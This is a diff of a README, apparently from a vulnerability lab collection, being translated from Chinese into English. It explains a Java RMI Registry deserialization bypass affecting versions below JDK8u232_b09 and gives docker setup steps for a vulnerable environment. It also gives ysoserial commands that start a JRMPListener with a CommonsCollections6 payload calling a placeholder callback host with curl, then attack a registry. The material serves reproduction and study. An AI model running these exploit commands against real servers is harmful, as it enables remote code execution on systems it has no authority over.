@@ -1,8 +1,10 @@
-# Java RMI Registry 反序列化漏洞(<jdk8u232_b09)
+# Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass
 
-Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).
+[中文版本(Chinese version)](README.zh-cn.md)
 
-自jdk8u121起，Registry对反序列化的类做了白名单限制
+Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Although remote binding is typically disabled, RMI Registry contains a remote binding functionality that can be exploited. By forging serialized data (implementing the Remote interface or dynamically proxying objects that implement the Remote interface) during the binding process, an attacker can trigger a deserialization vulnerability in the Registry when it processes the data.
+
+Since JDK 8u121, the Registry implements a whitelist restriction for deserialized classes:
 
 ```java
 if (String.class == clazz
@@ -20,33 +22,37 @@ if (String.class == clazz
 }
 ```
 
-我们需要在上面的几个白名单里面找到相应的可利用的类
-具体原理见[浅谈RMI Registry反序列化问题](http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/)
+We need to find exploitable classes within these whitelisted classes. For more details, see [A Discussion on RMI Registry Deserialization Issues](https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/), this article introduces the bypass methods that use JRMPListener to bypass the whitelist restriction.
 
-## 漏洞环境
+References:
 
-执行如下命令编译及启动RMI Registry和服务器：
+- <https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/>
+- <https://github.com/wh1t3p1g/ysoserial>
+
+## Environment Setup
+
+Execute the following commands to compile and start the RMI Registry and server:
 
 ```
 docker compose build
 docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
 ```
 
-其中，`your-ip`是服务器IP，客户端会根据这个IP来连接服务器。
+Replace `your-ip` with your server's IP address. The client will use this IP to connect to the server.
 
-环境启动后，RMI Registry监听在1099端口。
+After startup, the RMI Registry will be listening on port 1099.
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-通过[ysoserial](https://github.com/wh1t3p1g/ysoserial)的exploit包中的RMIRegistryExploit2或者3进行攻击
+Use RMIRegistryExploit2 or RMIRegistryExploit3 from [ysoserial](https://github.com/wh1t3p1g/ysoserial)'s exploit package to perform the attack:
 
 ```bash
-// 开启JRMPListener
+# Start JRMPListener
 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
-// 发起攻击
+# Launch the attack
 java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
 ```
 
-![image-20200206135822418](assets/README/image-20200206135822418.png)
+![](1.png)
 
-Registry会返回报错，这个没关系正常，命令会正常执行。
+The Registry will return an error, but this is normal and the command will still execute successfully.
